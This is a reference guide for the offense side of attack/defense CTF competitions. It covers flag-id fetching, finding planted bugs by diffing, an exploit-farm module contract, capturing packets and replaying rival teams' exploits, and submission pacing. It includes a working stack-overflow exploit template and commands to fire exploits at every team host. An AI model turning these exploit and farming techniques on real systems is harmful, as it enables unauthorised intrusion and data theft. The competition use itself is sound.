# Offense — flag ids, attack loop, traffic mining, submission pacing

All remote actions in this file are inside the event network under the A/D
pre-authorization (see `../ctf/SKILL.md` remote gate + SKILL.md operating
rules). Test everything against your own replica first.

## Flag ids

Organizers publish a per-team **flag id**: the identifier an exploit needs to
reach that team's flag — a team name, instance id, per-team credentials, or
nothing at all (some events key flags purely by host). Shape varies by event:
JSON API, scoreboard page, CSV paste. Read the rules to learn which.

Fetch once, normalize, cache — and refresh whenever the organizer announces
id rotation (common at day boundaries):

```bash
# farm/ids.json is keyed EXACTLY like farm/teams.txt hosts:
curl -s "$API/teams" | jq 'map({(.host): .flag_id}) | add' > farm/ids.json
# manual paste -> same shape by hand; ids.json example:
# { "10.10.3.1": "team01", "10.10.3.2": {"user": "ad", "password": "f0st3r"} }
```

- Values may be strings or structured (creds): the farm passes the JSON value
  through to the exploit untouched.
- Missing host in ids.json → `flag_id=None`; write exploits that tolerate it
  (some bugs need no id).
- `ids.json` is git-committed; flag *values* are never cached anywhere.

## Attack loop per service

1. **Identify the vuln from source** — you have the bundle. Trace
   `read request → parse → handler → sink`. Backdoor-diff trick: if the
   service vendors a known lib, fetch the pristine upstream release of that
   version and diff — the organizer's planted bug is the difference:

```bash
diff -ruN pristine-libfoo-1.2.3/ services/foo/orig/vendor/libfoo/ | less
```

2. **Write the exploit as a scratch script first**: `input → flag` against
   the local replica (`defense.md` compose). Iterate until deterministic;
   note exactly which bytes matter (offsets, encodings).
3. **Parameterize by `host` + `flag_id`** — no hardcoded replica addresses.
4. **Test only against your own instance.** Reasons: noise (their IDS and the
   organizer's logs record probes), leaks (a half-working exploit in someone
   else's pcap = they patch it and counter-adapt it against you), and you
   already own a byte-identical replica — remote debugging gains nothing.
5. **Weaponize into a farm module** — `farm/exploits/<svc>-<bug>.py`
   implementing the contract `scripts/farm.py` loads:

```python
#!/usr/bin/env python3
"""svc-foo stack overflow (CWE-121) — returns flag str or None. stdlib only."""
import asyncio

PORT = 5000

async def exploit(host, flag_id, timeout):
    """host: 'ip' or 'ip:port'; flag_id: value from ids.json (may be None)."""
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, PORT), timeout=timeout)
    except (OSError, asyncio.TimeoutError):
        return None
    try:
        await asyncio.wait_for(reader.read(1024), timeout=timeout)  # banner
        payload = b"A" * 264 + b"\x8f\x12\x40\x00\x00\x00\x00\x00" + b"\n"
        if flag_id:                       # event keys flags by team name
            payload = flag_id.encode() + b" " + payload
        writer.write(payload)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(4096), timeout=timeout)
        for tok in data.split():
            if tok.startswith(b"flag{"):  # use the event's real format
                return tok.decode()
        return None
    finally:
        writer.close()
```

Contract: module filename not starting with `_`, exposes
`async def exploit(host, flag_id, timeout) -> str | None`, returns the flag
string or None, never raises for a clean miss (the farm also catches).
Modules may import third-party libs (they run inside the farm process) — but
a module that throws at import time is logged and skipped, not fatal.

6. **Bring it up gradually**:

```bash
python3 scripts/farm.py --root farm --dry-run --exploit foo-bof   # replica only
python3 scripts/farm.py --root farm --exploit foo-bof --submit-cmd ./submit.sh
python3 scripts/farm.py --root farm --interval 300 --submit-cmd ./submit.sh   # full farm
```

## Traffic as feed (the A/D meta-game)

Every packet sent at your service is a possible free exploit. Always-on
capture on each gamebox service port:

```bash
sudo pacman -S --needed tcpdump
mkdir -p captures
# rotate every 300s (one tick), keep 96 files (~8 h), %-timestamped names
sudo tcpdump -i any -s0 -G 300 -W 96 -w captures/foo-%s.pcap port 5000
```

Run it from a systemd service or tmux so it survives reboots (`infra.md`).

Mine the captures each tick:

```bash
# cheap first pass: flag-shaped strings anywhere in the raw bytes
strings -n 4 captures/foo-*.pcap | grep -aE '[A-Za-z0-9_]{2,16}\{[^}]+\}' | sort -u

# then per stream — list TCP stream ids, follow one in ASCII
tshark -r captures/foo-1760000000.pcap -T fields -e tcp.stream | sort -un
tshark -r captures/foo-1760000000.pcap -q -z follow,tcp,ascii,7
```

How to read a stream against your service port: unusual request bytes in,
your service's data (or a flag!) out = someone's **working exploit**. Their
payload is the exploit — understand it, swap in your `flag_id`, fire it at
every team before they finish patching each other. Turnaround target: same
tick. Your own copy of the bug is now known-scanned, so patch your instance
in the same tick (`defense.md`) — offense and defense read the same pcap.

Bonus: streams that look like other teams' *recon* (probes, fuzz inputs)
tell you which of your services is being actively hunted.

## Submission pacing / replay protection

- Many organizers rate-limit submissions or penalize wrong flags; some accept
  one flag per team per service per tick. The farm enforces: cooldown between
  submissions (`--cooldown`), retry with backoff (`--backoff`, `--max-retries`),
  and dedupe so an accepted flag never resubmits.
- Never brute-force guesses at an A/D scoreboard — penalties hit the whole
  team and the queue exists precisely to avoid that.
- Endpoint specifics: custom A/D HTTP template in `infra.md`; CTFd/rCTF in
  `../ctf/references/submission.md`.

## Flag rotation → refarm every tick

Flags are re-planted by the checker each tick; a flag you hold from tick N is
worthless at N+1. Consequences:

- **Cache exploits, never flags.** The farm re-fires the full team × exploit
  matrix every cycle and re-extracts fresh values; `farm-state.json` dedupes
  only so a still-valid flag is not submitted twice.
- **Exploit hit-rate decays as teams patch.** Watch per-exploit stats in the
  cycle summary; retire dead modules (rename `foo-bof.py` → `_foo-bof.py` —
  the farm skips leading-underscore files) to cut noise, cycles, and the
  chance a dead exploit trips someone's IDS for nothing.
- When the organizer rotates **flag ids** too (rare, announced), refetch
  `ids.json` — exploits keyed on stale ids return junk or nothing.
